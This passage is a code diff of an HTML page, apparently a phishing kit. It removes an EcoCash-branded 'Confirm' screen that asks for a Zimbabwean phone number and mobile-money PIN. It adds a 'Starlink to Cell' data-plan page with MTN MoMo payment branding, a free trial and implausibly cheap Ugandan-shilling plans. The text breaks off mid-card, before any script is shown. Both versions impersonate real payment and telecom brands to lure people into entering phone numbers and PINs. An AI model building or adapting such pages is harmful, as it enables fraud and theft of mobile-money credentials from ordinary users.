@@ -1,360 +1,1114 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Confirm</title>
-
-<style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+  <title>Starlink to Cell · Data Plans</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet" />
+  <style>
+    /* ---------- RESET & GLOBAL ---------- */
     * {
-        box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      overflow-x: hidden;
+      width: 100%;
     }
 
     body {
-        margin: 0;
-        font-family: Arial, Helvetica, sans-serif;
-        background: #ffffff;
-        -webkit-font-smoothing: antialiased;
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      background: #0a1628;
+      min-height: 100vh;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding: 14px;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      position: relative;
     }
 
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(ellipse at 25% 15%, rgba(40, 80, 140, 0.35) 0%, transparent 45%),
+        radial-gradient(ellipse at 80% 75%, rgba(30, 70, 120, 0.25) 0%, transparent 50%),
+        radial-gradient(ellipse at 50% 50%, #0a1628 0%, #050d18 100%);
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    /* ---------- MAIN WHITE CONTAINER ---------- */
     .container {
-        max-width: 400px;
-        margin: auto;
-        padding: 32px 16px 0;
-        text-align: center;
+      width: 100%;
+      max-width: 540px;
+      background: #ffffff;
+      border-radius: 36px;
+      padding: 24px 16px 28px;
+      box-shadow: 0 30px 70px -18px rgba(0, 0, 0, 0.65), 0 0 0 1px rgba(255, 255, 255, 0.08);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      z-index: 1;
     }
 
-    .logo {
-        font-size: 44px;
-        font-weight: bold;
-        margin-bottom: 16px;
+    /* ---------- BRAND HEADER ---------- */
+    .brand {
+      text-align: center;
+      margin-bottom: 16px;
+      width: 100%;
+      padding: 0 4px;
     }
 
-    .logo span:first-child {
-        color: #0b5ed7;
+    .brand h1 {
+      font-size: 1.35rem;
+      font-weight: 800;
+      letter-spacing: -0.025em;
+      color: #0b1a2e;
+      line-height: 1.15;
     }
 
-    .logo span:last-child {
-        color: #e5533d;
+    .brand h1 .accent {
+      background: linear-gradient(135deg, #1f3a5f, #3a6ea5);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
     }
 
-    h2 {
-        font-weight: normal;
-        margin-bottom: 24px;
-        font-size: 20px;
+    .brand .sub-badge {
+      display: inline-block;
+      margin-top: 6px;
+      background: #eef3fc;
+      border-radius: 100px;
+      padding: 4px 14px;
+      font-size: 0.62rem;
+      font-weight: 600;
+      color: #1f4a7a;
+      letter-spacing: 0.4px;
+      text-transform: uppercase;
+      border: 1px solid rgba(31, 74, 122, 0.15);
     }
 
-    /* PHONE INPUT */
-    .phone-box {
-        border: 2px solid #0b5ed7;
-        border-radius: 12px;
-        padding: 12px 14px;
-        display: flex;
-        align-items: center;
-        gap: 10px;
-        margin-bottom: 14px;
-        background: #fff;
+    .brand .powered {
+      margin-top: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      font-size: 0.65rem;
+      color: #5f7a9a;
+      font-weight: 500;
+      letter-spacing: 0.3px;
     }
 
-    .flag-img {
-        width: 26px;
-        height: auto;
+    .brand .powered .mtn-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      background: #ffc107;
+      color: #0b1a2e;
+      font-weight: 800;
+      font-size: 0.62rem;
+      padding: 3px 10px;
+      border-radius: 4px;
+      letter-spacing: 0.4px;
+      border-bottom: 2px solid #1f4a7a;
     }
 
-    .country-code {
-        font-size: 16px;
-        font-weight: bold;
-        white-space: nowrap;
+    /* ---------- CARDS VERTICAL STACK ---------- */
+    .cards-stack {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+      width: 100%;
     }
 
-    .phone-input {
-        border: none;
-        outline: none;
-        font-size: 16px;
-        flex: 1;
-        padding: 6px 4px;
-        background: transparent;
+    /* ---------- CARD BASE — RECTANGULAR, COMPACT ---------- */
+    .card {
+      position: relative;
+      width: 94%;
+      max-width: 100%;
+      min-height: 200px;
+      border-radius: 24px;
+      padding: 18px 18px 16px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      color: #ffffff;
+      overflow: hidden;
+      isolation: isolate;
+      border: 1px solid rgba(255, 255, 255, 0.18);
+      box-shadow: 0 8px 22px -10px rgba(0, 0, 0, 0.4);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      background-size: cover;
+      background-position: center 30%;
+      background-repeat: no-repeat;
     }
 
-    .phone-input::placeholder {
-        color: #aaa;
+    .card:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 14px 32px -12px rgba(0, 0, 0, 0.5);
     }
 
-    .phone-box:focus-within {
-        box-shadow: 0 0 0 3px rgba(11,94,215,0.15);
+    .card::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(160deg, rgba(5, 15, 35, 0.72) 0%, rgba(8, 20, 45, 0.65) 50%, rgba(5, 12, 28, 0.78) 100%);
+      z-index: 1;
+      border-radius: inherit;
+      pointer-events: none;
     }
 
-    .pin-label {
-        margin-top: 18px;
-        color: #666;
-        font-size: 14px;
+    .card > * {
+      position: relative;
+      z-index: 2;
     }
 
-    /* PIN INPUTS */
-    .pin-boxes {
-        display: flex;
-        justify-content: center;
-        gap: 10px;
-        margin: 14px 0;
+    /* ---------- REALISTIC SATELLITE BACKGROUND ---------- */
+    .card-satellite {
+      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 400" width="600" height="400" preserveAspectRatio="xMidYMid slice"><defs><radialGradient id="spaceGrad" cx="50%" cy="20%" r="100%"><stop offset="0%" stop-color="%231a3050"/><stop offset="60%" stop-color="%230b1a2e"/><stop offset="100%" stop-color="%2305101c"/></radialGradient><radialGradient id="earthGlow" cx="50%" cy="100%" r="60%"><stop offset="0%" stop-color="%234a8fce" stop-opacity="0.55"/><stop offset="40%" stop-color="%232a5f99" stop-opacity="0.35"/><stop offset="100%" stop-color="%230a1628" stop-opacity="0"/></radialGradient><radialGradient id="earthSurface" cx="50%" cy="90%" r="55%"><stop offset="0%" stop-color="%233a6ea5"/><stop offset="55%" stop-color="%231f4a7a"/><stop offset="100%" stop-color="%230d1f3a"/></radialGradient><linearGradient id="panelGrad" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="%23486a8e"/><stop offset="50%" stop-color="%232a4a6e"/><stop offset="100%" stop-color="%231a3452"/></linearGradient><linearGradient id="panelGrad2" x1="1" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="%233a5a7e"/><stop offset="50%" stop-color="%2322405e"/><stop offset="100%" stop-color="%23182e48"/></linearGradient><filter id="satGlow"><feGaussianBlur stdDeviation="1.2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter></defs><rect width="600" height="400" fill="url(%23spaceGrad)"/><circle cx="480" cy="60" r="1.2" fill="%23ffffff" opacity="0.8"/><circle cx="80" cy="100" r="0.9" fill="%23ffffff" opacity="0.6"/><circle cx="520" cy="140" r="1" fill="%23ffffff" opacity="0.7"/><circle cx="150" cy="50" r="0.8" fill="%23ffffff" opacity="0.5"/><circle cx="420" cy="100" r="0.7" fill="%23ffffff" opacity="0.5"/><circle cx="60" cy="180" r="0.9" fill="%23ffffff" opacity="0.6"/><circle cx="550" cy="220" r="0.8" fill="%23ffffff" opacity="0.4"/><circle cx="300" cy="30" r="0.8" fill="%23ffffff" opacity="0.7"/><circle cx="180" cy="240" r="1" fill="%23ffffff" opacity="0.5"/><circle cx="480" cy="280" r="0.7" fill="%23ffffff" opacity="0.5"/><ellipse cx="300" cy="400" rx="520" ry="140" fill="url(%23earthGlow)"/><ellipse cx="300" cy="410" rx="480" ry="120" fill="url(%23earthSurface)"/><ellipse cx="300" cy="420" rx="440" ry="100" fill="%231a3a5e" opacity="0.7"/><path d="M0 340 Q150 320 300 330 T600 320 L600 400 L0 400 Z" fill="%23152842" opacity="0.6"/><g transform="translate(140, 100) rotate(-12)" filter="url(%23satGlow)"><rect x="70" y="18" width="120" height="8" rx="2" fill="%23aac8e0" opacity="0.9"/><rect x="70" y="34" width="120" height="8" rx="2" fill="%23aac8e0" opacity="0.9"/><rect x="-120" y="18" width="120" height="8" rx="2" fill="%2380a8c8" opacity="0.85"/><rect x="-120" y="34" width="120" height="8" rx="2" fill="%2380a8c8" opacity="0.85"/><rect x="-150" y="4" width="75" height="52" rx="4" fill="url(%23panelGrad)" stroke="%235a8ab5" stroke-width="0.8"/><rect x="-70" y="4" width="75" height="52" rx="4" fill="url(%23panelGrad)" stroke="%235a8ab5" stroke-width="0.8"/><rect x="-5" y="4" width="75" height="52" rx="4" fill="url(%23panelGrad2)" stroke="%235a8ab5" stroke-width="0.8"/><rect x="75" y="4" width="75" height="52" rx="4" fill="url(%23panelGrad2)" stroke="%235a8ab5" stroke-width="0.8"/><rect x="155" y="4" width="75" height="52" rx="4" fill="url(%23panelGrad)" stroke="%235a8ab5" stroke-width="0.8"/><circle cx="188" cy="60" r="10" fill="%23e0ecf8" opacity="0.95"/><circle cx="188" cy="60" r="4" fill="%23ffffff"/></g><g transform="translate(420, 200) rotate(18)" filter="url(%23satGlow)" opacity="0.92"><rect x="60" y="14" width="100" height="7" rx="2" fill="%23aac8e0" opacity="0.9"/><rect x="60" y="28" width="100" height="7" rx="2" fill="%23aac8e0" opacity="0.9"/><rect x="-100" y="14" width="100" height="7" rx="2" fill="%2380a8c8" opacity="0.85"/><rect x="-100" y="28" width="100" height="7" rx="2" fill="%2380a8c8" opacity="0.85"/><rect x="-130" y="2" width="62" height="44" rx="4" fill="url(%23panelGrad)" stroke="%235a8ab5" stroke-width="0.7"/><rect x="-60" y="2" width="62" height="44" rx="4" fill="url(%23panelGrad2)" stroke="%235a8ab5" stroke-width="0.7"/><rect x="5" y="2" width="62" height="44" rx="4" fill="url(%23panelGrad2)" stroke="%235a8ab5" stroke-width="0.7"/><rect x="70" y="2" width="62" height="44" rx="4" fill="url(%23panelGrad)" stroke="%235a8ab5" stroke-width="0.7"/><circle cx="140" cy="50" r="8" fill="%23e0ecf8" opacity="0.95"/><circle cx="140" cy="50" r="3" fill="%23ffffff"/></g><g transform="translate(280, 50) rotate(5)" opacity="0.65"><rect x="40" y="10" width="70" height="5" rx="2" fill="%23aac8e0"/><rect x="40" y="20" width="70" height="5" rx="2" fill="%23aac8e0"/><rect x="-70" y="10" width="70" height="5" rx="2" fill="%2380a8c8"/><rect x="-70" y="20" width="70" height="5" rx="2" fill="%2380a8c8"/><rect x="-95" y="0" width="45" height="32" rx="3" fill="url(%23panelGrad)" stroke="%235a8ab5" stroke-width="0.6"/><rect x="-45" y="0" width="45" height="32" rx="3" fill="url(%23panelGrad2)" stroke="%235a8ab5" stroke-width="0.6"/><rect x="5" y="0" width="45" height="32" rx="3" fill="url(%23panelGrad2)" stroke="%235a8ab5" stroke-width="0.6"/><rect x="55" y="0" width="45" height="32" rx="3" fill="url(%23panelGrad)" stroke="%235a8ab5" stroke-width="0.6"/></g></svg>');
     }
 
-    .pin-boxes input {
-        width: 48px;
-        height: 48px;
-        border: 2px solid #0b5ed7;
-        border-radius: 10px;
-        font-size: 20px;
-        text-align: center;
-        outline: none;
+    /* ---------- SLATE-BLUE GRADIENT CARD ---------- */
+    .card-gradient {
+      background: linear-gradient(155deg, #3a5a7e 0%, #2a4a6e 35%, #1d3450 70%, #14243a 100%);
     }
 
-    .pin-boxes input:focus {
-        box-shadow: 0 0 0 3px rgba(11,94,215,0.15);
+    .card-gradient::after {
+      background: linear-gradient(160deg, rgba(20, 40, 70, 0.25) 0%, rgba(10, 25, 50, 0.35) 100%);
     }
 
-    .forgot {
-        color: #666;
-        font-size: 13px;
-        margin-bottom: 10px;
+    /* ---------- BADGE ---------- */
+    .badge {
+      align-self: flex-start;
+      background: rgba(210, 225, 245, 0.22);
+      backdrop-filter: blur(6px);
+      -webkit-backdrop-filter: blur(6px);
+      border: 1px solid rgba(255, 255, 255, 0.28);
+      padding: 4px 12px;
+      border-radius: 100px;
+      font-size: 0.6rem;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      color: #ffffff;
+      margin-bottom: 4px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
     }
 
-    /* BOTTOM SECTION */
-    .bottom {
-        position: relative;
-        background: #0b5ed7;
-        padding: 56px 16px 24px;
-        color: #fff;
-        text-align: center;
-        overflow: hidden;
-        margin-top: 30px;
+    /* ---------- TITLE ---------- */
+    .card-title {
+      font-size: 1.35rem;
+      font-weight: 800;
+      line-height: 1.15;
+      margin: 4px 0 2px;
+      letter-spacing: -0.025em;
+      text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+      width: 100%;
     }
 
-    .bottom::before {
-        content: "";
-        position: absolute;
-        top: -45px;
-        left: 0;
-        width: 100%;
-        height: 90px;
-        background: #ffffff;
-        border-bottom-left-radius: 100% 100%;
-        border-bottom-right-radius: 100% 100%;
+    /* ---------- DURATION ---------- */
+    .card-duration {
+      font-size: 0.78rem;
+      font-weight: 500;
+      color: #d8e2f0;
+      background: rgba(0, 0, 0, 0.22);
+      padding: 2px 14px;
+      border-radius: 100px;
+      display: inline-block;
+      margin-bottom: 8px;
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      letter-spacing: 0.15px;
     }
 
-    .bottom p {
-        margin-bottom: 22px;
-        font-size: 14px;
-        line-height: 1.4;
+    /* ---------- PRICE ---------- */
+    .card-price {
+      font-size: 2rem;
+      font-weight: 800;
+      letter-spacing: -0.03em;
+      margin: 6px 0 10px;
+      text-shadow: 0 4px 16px rgba(0, 0, 0, 0.55);
+      line-height: 1;
+      display: flex;
+      align-items: baseline;
+      justify-content: center;
+      gap: 4px;
     }
 
-    .buttons {
-        display: flex;
+    .card-price small {
+      font-size: 0.8rem;
+      font-weight: 600;
+      opacity: 0.85;
+      letter-spacing: 0.3px;
+    }
+
+    /* ---------- VIEW DETAILS LINK ---------- */
+    .card-link {
+      margin-top: auto;
+      color: #ffffff;
+      font-weight: 700;
+      font-size: 0.82rem;
+      background: rgba(255, 255, 255, 0.13);
+      border: 1px solid rgba(255, 255, 255, 0.32);
+      padding: 9px 22px;
+      border-radius: 100px;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      transition: background 0.2s, border-color 0.2s, transform 0.12s;
+      cursor: pointer;
+      backdrop-filter: blur(6px);
+      -webkit-backdrop-filter: blur(6px);
+      width: fit-content;
+      letter-spacing: 0.1px;
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.2);
+    }
+
+    .card-link:hover {
+      background: rgba(255, 255, 255, 0.24);
+      border-color: rgba(255, 255, 255, 0.55);
+    }
+
+    .card-link:active {
+      transform: scale(0.97);
+    }
+
+    /* ---------- BOTTOM INFO ---------- */
+    .bottom-info {
+      max-width: 420px;
+      margin: 20px auto 0;
+      text-align: center;
+      color: #5f7a9a;
+      font-size: 0.72rem;
+      line-height: 1.7;
+      font-weight: 450;
+      padding: 0 10px;
+      letter-spacing: 0.15px;
+    }
+
+    /* ---------- MODAL & CHECKOUT ---------- */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(5, 15, 30, 0.82);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.25s ease, visibility 0.25s;
+      z-index: 1000;
+    }
+
+    .modal-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .modal-content {
+      background: #ffffff;
+      width: 100%;
+      max-width: 440px;
+      border-radius: 28px;
+      padding: 24px 20px 20px;
+      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
+      transform: scale(0.95);
+      transition: transform 0.25s ease;
+      max-height: 90vh;
+      overflow-y: auto;
+      position: relative;
+      color: #1a2b3f;
+    }
+
+    .modal-overlay.active .modal-content {
+      transform: scale(1);
+    }
+
+    .modal-close {
+      position: absolute;
+      top: 16px;
+      right: 16px;
+      background: #f0f4fc;
+      border: none;
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      font-size: 1.3rem;
+      font-weight: 500;
+      color: #2a4b6e;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.2s;
+      line-height: 1;
+      z-index: 10;
+    }
+
+    .modal-close:hover {
+      background: #dbe6f5;
+    }
+
+    .modal-pkg-name {
+      font-size: 1.6rem;
+      font-weight: 800;
+      color: #0b1a2e;
+      margin: 6px 0 2px;
+      letter-spacing: -0.025em;
+      padding-right: 36px;
+    }
+
+    .modal-pkg-duration {
+      font-size: 0.85rem;
+      color: #4b6f95;
+      margin-bottom: 6px;
+      font-weight: 500;
+    }
+
+    .modal-pkg-price {
+      font-size: 2rem;
+      font-weight: 800;
+      color: #1f4a7a;
+      margin: 6px 0 10px;
+      letter-spacing: -0.025em;
+      display: flex;
+      align-items: baseline;
+      gap: 4px;
+    }
+
+    .modal-pkg-price small {
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: #6b8aac;
+    }
+
+    .modal-desc {
+      background: #f5f9ff;
+      padding: 14px 16px;
+      border-radius: 16px;
+      color: #2a405a;
+      font-size: 0.85rem;
+      line-height: 1.6;
+      margin: 10px 0 18px;
+      border: 1px solid #e2eaf5;
+    }
+
+    .checkout-form {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 6px;
+    }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+      text-align: left;
+    }
+
+    .form-group label {
+      font-size: 0.75rem;
+      font-weight: 600;
+      color: #1f3a5f;
+      letter-spacing: 0.2px;
+    }
+
+    .form-group input {
+      padding: 12px 14px;
+      border-radius: 14px;
+      border: 1.5px solid #dbe4f0;
+      font-size: 0.9rem;
+      background: #fafdff;
+      transition: border 0.2s, box-shadow 0.2s;
+      color: #0b1a2e;
+      font-weight: 500;
+      font-family: inherit;
+    }
+
+    .form-group input:focus {
+      outline: none;
+      border-color: #ffc107;
+      box-shadow: 0 0 0 4px rgba(255, 193, 7, 0.2);
+      background: #ffffff;
+    }
+
+    .form-group input::placeholder {
+      color: #9bb1c9;
+      font-weight: 400;
+    }
+
+    .form-group input:disabled {
+      background: #f0f4fc;
+      color: #1f3a5f;
+      border-color: #cdddec;
+      font-weight: 600;
+    }
+
+    .mtn-pay-btn {
+      background: #ffc107;
+      border: none;
+      border-radius: 60px;
+      padding: 15px 18px;
+      font-size: 0.95rem;
+      font-weight: 800;
+      color: #0b1a2e;
+      letter-spacing: 0.3px;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
+      box-shadow: 0 8px 20px rgba(255, 193, 7, 0.35);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      border-bottom: 4px solid #1f4a7a;
+      font-family: inherit;
+    }
+
+    .mtn-pay-btn:hover {
+      background: #ffd43b;
+    }
+
+    .mtn-pay-btn:active {
+      transform: scale(0.98);
+    }
+
+    .processing-state {
+      text-align: center;
+      padding: 24px 10px 20px;
+      display: none;
+    }
+
+    .processing-state.active {
+      display: block;
+    }
+
+    .processing-icon {
+      font-size: 3rem;
+      margin-bottom: 14px;
+      animation: pulse 1.6s infinite;
+    }
+
+    @keyframes pulse {
+      0% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.7; transform: scale(1.06); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+
+    .processing-state h3 {
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: #0b1a2e;
+      margin-bottom: 10px;
+    }
+
+    .processing-state p {
+      color: #2a4b6e;
+      font-size: 0.88rem;
+      line-height: 1.6;
+      max-width: 300px;
+      margin: 0 auto;
+      background: #f5f9ff;
+      padding: 16px 18px;
+      border-radius: 18px;
+      border: 1px solid #e2eaf5;
+    }
+
+    .modal-back {
+      background: none;
+      border: none;
+      color: #4b7ab0;
+      font-weight: 600;
+      font-size: 0.85rem;
+      cursor: pointer;
+      padding: 14px 0 4px;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      transition: color 0.2s;
+      text-decoration: underline;
+      text-underline-offset: 3px;
+      font-family: inherit;
+    }
+
+    .modal-back:hover {
+      color: #1f4a7a;
+    }
+
+    /* ---------- RESPONSIVE ---------- */
+    @media (min-width: 480px) {
+      .container {
+        padding: 32px 22px 36px;
+        border-radius: 40px;
+      }
+
+      .brand h1 {
+        font-size: 1.6rem;
+      }
+
+      .brand .sub-badge {
+        font-size: 0.68rem;
+        padding: 5px 16px;
+      }
+
+      .brand .powered {
+        font-size: 0.7rem;
+      }
+
+      .brand .powered .mtn-badge {
+        font-size: 0.68rem;
+        padding: 3px 12px;
+      }
+
+      .card {
+        min-height: 210px;
+        padding: 20px 20px 18px;
+        border-radius: 26px;
+      }
+
+      .card-title {
+        font-size: 1.5rem;
+      }
+
+      .card-duration {
+        font-size: 0.85rem;
+      }
+
+      .card-price {
+        font-size: 2.2rem;
+      }
+
+      .card-price small {
+        font-size: 0.85rem;
+      }
+
+      .card-link {
+        font-size: 0.88rem;
+        padding: 10px 26px;
+      }
+
+      .cards-stack {
+        gap: 16px;
+      }
+
+      .bottom-info {
+        font-size: 0.78rem;
+        max-width: 460px;
+        margin-top: 24px;
+      }
+    }
+
+    @media (min-width: 620px) {
+      body {
+        padding: 28px 20px;
+      }
+
+      .container {
+        max-width: 580px;
+        padding: 40px 32px 44px;
+        border-radius: 48px;
+      }
+
+      .brand {
+        margin-bottom: 20px;
+      }
+
+      .brand h1 {
+        font-size: 1.85rem;
+      }
+
+      .brand .powered {
+        font-size: 0.75rem;
+        margin-top: 12px;
+      }
+
+      .cards-stack {
+        gap: 18px;
+      }
+
+      .card {
+        min-height: 220px;
+        padding: 22px 24px 20px;
+        border-radius: 28px;
+      }
+
+      .card-title {
+        font-size: 1.65rem;
+      }
+
+      .card-duration {
+        font-size: 0.9rem;
+      }
+
+      .card-price {
+        font-size: 2.4rem;
+      }
+
+      .card-price small {
+        font-size: 0.9rem;
+      }
+
+      .card-link {
+        font-size: 0.92rem;
+        padding: 11px 28px;
+      }
+
+      .bottom-info {
+        font-size: 0.82rem;
+        max-width: 500px;
+        margin-top: 28px;
+        line-height: 1.8;
+      }
+    }
+
+    @media (min-width: 1024px) {
+      body {
+        padding: 36px 28px;
+      }
+
+      .container {
+        max-width: 600px;
+        padding: 44px 40px 48px;
+      }
+
+      .brand h1 {
+        font-size: 2rem;
+      }
+
+      .cards-stack {
+        gap: 20px;
+      }
+
+      .card {
+        min-height: 230px;
+        padding: 24px 28px 22px;
+      }
+
+      .card-title {
+        font-size: 1.75rem;
+      }
+
+      .card-price {
+        font-size: 2.6rem;
+      }
+
+      .card-link {
+        font-size: 0.95rem;
+        padding: 12px 30px;
+      }
+
+      .bottom-info {
+        font-size: 0.85rem;
+        max-width: 540px;
+        margin-top: 32px;
+      }
+    }
+
+    /* Small phone adjustments */
+    @media (max-width: 380px) {
+      .container {
+        padding: 20px 12px 24px;
+        border-radius: 28px;
+      }
+
+      .brand h1 {
+        font-size: 1.15rem;
+      }
+
+      .brand .sub-badge {
+        font-size: 0.55rem;
+        padding: 3px 10px;
+        margin-top: 5px;
+      }
+
+      .brand .powered {
+        font-size: 0.58rem;
+        margin-top: 8px;
+      }
+
+      .brand .powered .mtn-badge {
+        font-size: 0.55rem;
+        padding: 2px 8px;
+      }
+
+      .cards-stack {
         gap: 12px;
-        justify-content: center;
-        flex-wrap: wrap;
-        margin-bottom: 22px;
+      }
+
+      .card {
+        min-height: 190px;
+        padding: 16px 14px 14px;
+        border-radius: 22px;
+      }
+
+      .card-title {
+        font-size: 1.2rem;
+      }
+
+      .card-duration {
+        font-size: 0.72rem;
+        padding: 2px 12px;
+      }
+
+      .card-price {
+        font-size: 1.7rem;
+      }
+
+      .card-price small {
+        font-size: 0.72rem;
+      }
+
+      .card-link {
+        font-size: 0.75rem;
+        padding: 8px 18px;
+      }
+
+      .badge {
+        font-size: 0.55rem;
+        padding: 3px 10px;
+      }
+
+      .bottom-info {
+        font-size: 0.68rem;
+        line-height: 1.65;
+        margin-top: 18px;
+        max-width: 100%;
+      }
+
+      .modal-content {
+        padding: 20px 16px 18px;
+        border-radius: 24px;
+      }
+
+      .modal-pkg-name {
+        font-size: 1.4rem;
+      }
+
+      .modal-pkg-price {
+        font-size: 1.8rem;
+      }
     }
 
-    .btn {
-        background: #fff;
-        color: #0b5ed7;
-        padding: 14px;
-        width: 150px;
-        border-radius: 14px;
-        font-weight: bold;
-        border: none;
-        font-size: 14px;
-        cursor: pointer;
+    /* Utility */
+    .hidden {
+      display: none !important;
     }
-
-    .btn:active {
-        transform: scale(0.98);
-    }
-
-    .version {
-        font-size: 12px;
-        margin-bottom: 6px;
-    }
-
-    .terms {
-        font-size: 11px;
-        line-height: 1.4;
-    }
-
-    .terms a {
-        color: #fff;
-        text-decoration: underline;
-    }
-
-    /* ===== SMALL SCREENS ===== */
-    @media (max-width: 360px) {
-        .logo {
-            font-size: 38px;
-        }
-
-        .pin-boxes input {
-            width: 44px;
-            height: 44px;
-        }
-
-        .btn {
-            width: 100%;
-            max-width: 220px;
-        }
-    }
-</style>
+  </style>
 </head>
-
 <body>
-
-<div class="container">
-    <div class="logo">
-        <span>Eco</span><span>Cash</span>
+  <div class="container">
+    <!-- BRAND -->
+    <div class="brand">
+      <h1>
+        <span class="accent">Starlink to Cell</span>
+      </h1>
+      <div class="sub-badge">Data Plans</div>
+      <div class="powered">
+        <span class="mtn-badge">MTN MoMo</span> Payment
+      </div>
     </div>
 
-    <h2>Login</h2>
+    <!-- PRICING CARDS — VERTICAL STACK -->
+    <div class="cards-stack">
+      <!-- CARD 1: New users only — 5GB -->
+      <div class="card card-satellite" data-package="5GB Data">
+        <span class="badge">New users only</span>
+        <div class="card-title">5GB Data</div>
+        <div class="card-duration">2-Day Plan</div>
+        <div class="card-price"><small>Free</small>trial</div>
+        <div class="card-link" data-package="5GB Data" data-duration="2-Day Plan" data-price="0.00" data-desc="5GB free trial data for new users. Try Starlink to Cell for 2 days with no commitment. Full speed satellite connectivity.">View details →</div>
+      </div>
 
-    <div class="phone-box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Flag_of_Zimbabwe.svg" alt="ZW" class="flag-img">
-        <span class="country-code">+263</span>
-        <input
-            type="tel"
-            id="phone"
-            class="phone-input"
-            placeholder=""
-            inputmode="numeric"
-        >
+      <!-- CARD 2: Best for light users — 15GB -->
+      <div class="card card-satellite" data-package="15GB Data">
+        <span class="badge">Best for light users</span>
+        <div class="card-title">15GB Data</div>
+        <div class="card-duration">7-Day Plan</div>
+        <div class="card-price"><small>UGX</small>3,700</div>
+        <div class="card-link" data-package="15GB Data" data-duration="7-Day Plan" data-price="3700" data-desc="15GB of high-speed satellite data for light browsing, social media and messaging. Valid for 7 days. Perfect for occasional use.">View details →</div>
+      </div>
+
+      <!-- CARD 3: Balanced — 35GB -->
+      <div class="card card-satellite" data-package="35GB Data">
+        <span class="badge">Balanced</span>
+        <div class="card-title">35GB Data</div>
+        <div class="card-duration">14-Day Plan</div>
+        <div class="card-price"><small>UGX</small>7,400</div>
+        <div class="card-link" data-package="35GB Data" data-duration="14-Day Plan" data-price="7400" data-desc="35GB of data for balanced usage — streaming, browsing and working. Valid for 14 days across all coverage zones.">View details →</div>
+      </div>
+
+      <!-- CARD 4: Heavy use — 50GB -->
+      <div class="card card-satellite" data-package="50GB Data">
+        <span class="badge">Heavy use</span>
+        <div class="card-title">50GB Data</div>
+        <div class="card-duration">21-Day Plan</div>
+        <div class="card-price"><small>UGX</small>11,100</div>
+        <div class="card-link" data-package="50GB Data" data-duration="21-Day Plan" data-price="11100" data-desc="50GB high-speed data for heavy streaming, downloads and remote work. Valid for 21 days across all Starlink to Cell coverage zones.">View details →</div>
+      </div>
+
+      <!-- CARD 5: Most popular — Monthly Unlimited -->
+      <div class="card card-satellite" data-package="Monthly Unlimited">
+        <span class="badge">Most popular</span>
+        <div class="card-title">Monthly Unlimited</div>
+        <div class="card-duration">30-Day Plan</div>
+        <div class="card-price"><small>UGX</small>14,800</div>
+        <div class="card-link" data-package="Monthly Unlimited" data-duration="30-Day Plan" data-price="14800" data-desc="Unlimited data for 30 days. Stream, browse and connect without limits. Ideal for families and remote workers. Subject to fair usage policy.">View details →</div>
+      </div>
+
+      <!-- CARD 6: 5G Coverage — 5G Monthly Unlimited -->
+      <div class="card card-gradient" data-package="5G Monthly Unlimited">
+        <span class="badge">5G Coverage</span>
+        <div class="card-title">5G Monthly Unlimited</div>
+        <div class="card-duration">30-Day Plan</div>
+        <div class="card-price"><small>UGX</small>29,600</div>
